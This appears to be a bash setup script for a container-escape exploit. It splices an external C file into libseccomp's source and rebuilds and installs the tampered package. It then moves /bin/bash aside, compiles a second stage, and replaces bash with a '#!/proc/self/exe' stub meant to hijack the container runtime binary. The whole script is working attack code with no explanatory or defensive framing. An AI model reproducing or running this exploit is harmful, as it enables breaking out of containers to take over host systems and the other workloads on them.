#!/bin/bash
cd /root/libseccomp-2.3.1 
cat /root/stage1.c >> src/api.c
DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us
dpkg -i /root/*.deb
mv /bin/bash /bin/good_bash
gcc /root/stage2.c -o /stage2
cat >/bin/bash <<EOF
#!/proc/self/exe
EOF
chmod +x /bin/bash
